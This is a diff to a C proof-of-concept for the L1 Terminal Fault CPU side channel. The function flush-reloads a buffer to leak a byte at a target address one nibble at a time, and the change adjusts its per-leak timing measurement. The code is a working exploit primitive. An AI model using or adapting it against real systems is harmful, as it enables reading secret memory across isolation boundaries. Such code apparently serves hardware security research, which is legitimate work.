@@ -44,25 +44,33 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
 
   size_t nr_of_leaks = 0;
+  long elapsed_ns = 0;
   struct timespec start, end;
-  clock_gettime(CLOCK_MONOTONIC, &start);
 
   do {
     flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+
+    clock_gettime(CLOCK_MONOTONIC, &start);
     asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
-    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+    clock_gettime(CLOCK_MONOTONIC, &end);
     nr_of_leaks += 1;
+    elapsed_ns += (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
+
+    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
   } while (high == -1);
 
   do {
     flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+
+    clock_gettime(CLOCK_MONOTONIC, &start);
     asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
-    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+    clock_gettime(CLOCK_MONOTONIC, &end);
     nr_of_leaks += 1;
+    elapsed_ns += (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
+
+    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
   } while (low == -1);
 
-  clock_gettime(CLOCK_MONOTONIC, &end);
-  long elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
   printf("#leaks: %ld\ttime: %ld\tns per leak: %ld\n", nr_of_leaks, elapsed_ns, elapsed_ns / nr_of_leaks);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
